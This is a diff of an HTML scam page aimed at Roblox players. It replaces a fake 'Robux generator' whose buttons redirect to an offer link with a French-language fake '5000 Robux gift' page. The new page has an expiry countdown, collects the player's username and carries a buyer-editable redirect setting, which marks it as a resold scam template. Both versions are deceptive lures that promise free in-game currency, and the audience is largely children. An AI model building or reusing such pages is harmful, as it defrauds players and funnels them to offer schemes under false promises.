@@ -1,214 +1,79 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Robux Packages | Generator</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      background: #f0f2f5;
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      padding: 2rem 1.5rem;
-      color: #111;
-    }
-
-    /* simple container – no extra graphics, no emojis */
-    .packages-container {
-      max-width: 780px;
-      margin: 0 auto;
-    }
-
-    /* optional subtle heading (plain text, no icons) */
-    .page-heading {
-      text-align: center;
-      margin-bottom: 2rem;
-    }
-    .page-heading h1 {
-      font-weight: 700;
-      font-size: 1.8rem;
-      letter-spacing: -0.3px;
-      color: #1e2a3e;
-    }
-    .page-heading p {
-      color: #4a5b6e;
-      font-size: 0.9rem;
-      margin-top: 0.3rem;
-    }
-
-    /* package card – clean, exactly like screenshot style */
-    .package-card {
-      background: #ffffff;
-      border-radius: 24px;
-      padding: 1.2rem 1.5rem;
-      margin-bottom: 1rem;
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      justify-content: space-between;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03), 0 0 0 1px #e8ecf2;
-      transition: 0.1s ease;
-    }
-    .package-info {
-      flex: 2;
-    }
-    .main-amount {
-      font-size: 1.9rem;
-      font-weight: 800;
-      color: #0a1424;
-      letter-spacing: -0.5px;
-      line-height: 1.2;
-    }
-    .bonus-details {
-      font-size: 0.9rem;
-      color: #4a5b6e;
-      margin-top: 6px;
-      font-weight: 500;
-    }
-    .bonus-details span {
-      background: #f4f6fa;
-      padding: 0.2rem 0.7rem;
-      border-radius: 20px;
-      display: inline-block;
-    }
-    .generate-btn {
-      background: #e03a3e;
-      border: none;
-      color: white;
-      font-weight: 700;
-      font-size: 0.85rem;
-      padding: 0.7rem 1.8rem;
-      border-radius: 40px;
-      cursor: pointer;
-      transition: 0.15s;
-      letter-spacing: 0.3px;
-      font-family: inherit;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-      white-space: nowrap;
-    }
-    .generate-btn:hover {
-      background: #c12d31;
-      transform: scale(0.97);
-    }
-    .generate-btn:active {
-      transform: scale(0.95);
-    }
-
-    /* responsive: on narrow screens, stack content */
-    @media (max-width: 550px) {
-      .package-card {
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 1rem;
-      }
-      .generate-btn {
-        width: 100%;
-        text-align: center;
-        padding: 0.75rem;
-      }
-      .main-amount {
-        font-size: 1.7rem;
-      }
-      body {
-        padding: 1rem;
-      }
-    }
-
-    /* no emojis, no icons, no username field, no suggested text */
-    hr {
-      display: none;
-    }
-    button {
-      background: none;
-      border: none;
-    }
-  </style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Roblox 5000 Robux Gift Redeem</title>
+  <meta name="description" content="Recupere ton cadeau Robux avant expiration." data-i18n-meta="description">
+  <meta property="og:title" content="Vous avez recu 5000 Robux" data-i18n-meta="ogTitle">
+  <meta property="og:description" content="Recupere ton cadeau Robux avant expiration." data-i18n-meta="description">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://example.com/">
+  <meta property="og:image" content="images/Gqqe3TPIp7pL.webp">
+  <link rel="canonical" href="https://example.com/">
+  <link rel="icon" type="image/svg+xml" href="images/yqrn9wVqtf7s.svg">
+  <link rel="stylesheet" href="css/redeem-gift.css">
+  <!-- Buyer config: edit config.js to set the redirect URL. -->
+  <script src="config.js"></script>
 </head>
 <body>
-<div class="packages-container">
-  <div class="page-heading">
-    <h1>Robux packages</h1>
-    <p>Select your amount — generate instantly</p>
-  </div>
+  <main class="redeem-page">
+    <header class="language-bar">
+      <label class="language-label" for="language-select" data-i18n="languageLabel">Langue</label>
+      <select class="language-select" id="language-select" aria-label="Language">
+        <option value="fr">Francais</option>
+        <option value="en">English</option>
+        <option value="es">Espanol</option>
+        <option value="de">Deutsch</option>
+        <option value="pt">Portugues</option>
+        <option value="it">Italiano</option>
+      </select>
+    </header>
 
-  <!-- exact packages from screenshot: main amount + bonus string (prices removed) -->
-  <!-- each package shows the exact numbers as provided: 5,250 / + 4,500 + 750 more etc -->
-  <div class="package-card">
-    <div class="package-info">
-      <div class="main-amount">5,250</div>
-      <div class="bonus-details"><span>+ 4,500 + 750 more</span></div>
-    </div>
-    <button class="generate-btn" data-amount="5250">GENERATE</button>
-  </div>
+    <section class="gift-stage">
+      <div class="gift-card" aria-live="polite">
+        <h1 data-i18n="title">RECUPERER<br>CADEAU</h1>
+        <img class="gift-icon" src="images/YzXr5i06sU0P.webp" alt="" width="112" height="112">
+        <p class="gift-copy">
+          <span data-i18n="giftPrefix">Vous avez recu</span>
+          <img src="images/YRv0cUNGIx9q.svg" alt="" width="26" height="26">
+          <strong>5000 Robux</strong>
+        </p>
+        <button class="claim-button" type="button" id="open-claim" data-i18n="claimButton">RECLAMER</button>
+      </div>
 
-  <div class="package-card">
-    <div class="package-info">
-      <div class="main-amount">3,625</div>
-      <div class="bonus-details"><span>+ 3,150 + 475 more</span></div>
-    </div>
-    <button class="generate-btn" data-amount="3625">GENERATE</button>
-  </div>
+      <form class="claim-modal" id="claim-form" hidden>
+        <button class="close-button" type="button" id="close-claim" aria-label="Close">x</button>
+        <h2 data-i18n="modalTitle">Confirmer le compte</h2>
+        <p data-i18n="modalCopy">Entre ton pseudo Roblox pour reserver le cadeau.</p>
+        <label for="username" data-i18n="usernameLabel">Pseudo Roblox</label>
+        <input id="username" name="username" type="text" minlength="3" autocomplete="off" placeholder="Ton pseudo" data-i18n-placeholder="usernamePlaceholder" required>
+        <button class="final-button" type="submit" data-i18n="finalButton">Claim reward</button>
+        <span id="claim-status" class="claim-status"></span>
+      </form>
+    </section>
 
-  <div class="package-card">
-    <div class="package-info">
-      <div class="main-amount">2,000</div>
-      <div class="bonus-details"><span>+ 1,700 + 300 more</span></div>
-    </div>
-    <button class="generate-btn" data-amount="2000">GENERATE</button>
-  </div>
+    <section class="countdown" aria-label="Expiration">
+      <div>
+        <strong id="days">1</strong>
+        <span data-i18n="dayLabel">Day</span>
+      </div>
+      <div>
+        <strong id="hours">12</strong>
+        <span data-i18n="hoursLabel">Hours</span>
+      </div>
+      <div>
+        <strong id="minutes">17</strong>
+        <span data-i18n="minutesLabel">Minutes</span>
+      </div>
+      <div>
+        <strong id="seconds">56</strong>
+        <span data-i18n="secondsLabel">Seconds</span>
+      </div>
+    </section>
+  </main>
 
-  <div class="package-card">
-    <div class="package-info">
-      <div class="main-amount">1,500</div>
-      <div class="bonus-details"><span>+ 1,200 + 300 more</span></div>
-    </div>
-    <button class="generate-btn" data-amount="1500">GENERATE</button>
-  </div>
-
-  <div class="package-card">
-    <div class="package-info">
-      <div class="main-amount">1,000</div>
-      <div class="bonus-details"><span>+ 800 + 200 more</span></div>
-    </div>
-    <button class="generate-btn" data-amount="1000">GENERATE</button>
-  </div>
-
-  <div class="package-card">
-    <div class="package-info">
-      <div class="main-amount">500</div>
-      <div class="bonus-details"><span>+ 400 + 100 more</span></div>
-    </div>
-    <button class="generate-btn" data-amount="500">GENERATE</button>
-  </div>
-
-  <!-- no extra elements, no emojis, no username field, no suggested usernames -->
-</div>
-
-<script>
-  // TARGET REDIRECT URL (exactly as provided)
-  const REDIRECT_URL = "https://targetoffers.xyz/cl/i/pqrwj4";
-
-  // select all generate buttons
-  const generateButtons = document.querySelectorAll('.generate-btn');
-
-  // direct redirect on click – no alerts, no emojis, no username validation
-  function redirectToOffer() {
-    window.location.href = REDIRECT_URL;
-  }
-
-  // attach event listener to each button
-  generateButtons.forEach(btn => {
-    btn.addEventListener('click', (e) => {
-      e.preventDefault();
-      // no extra messages, no fancy toasts, no emojis – pure redirect
-      redirectToOffer();
-    });
-  });
-</script>
+  <script src="js/redeem-gift.js"></script>
+  <script src="redirect-handler.js"></script>
 </body>
 </html>
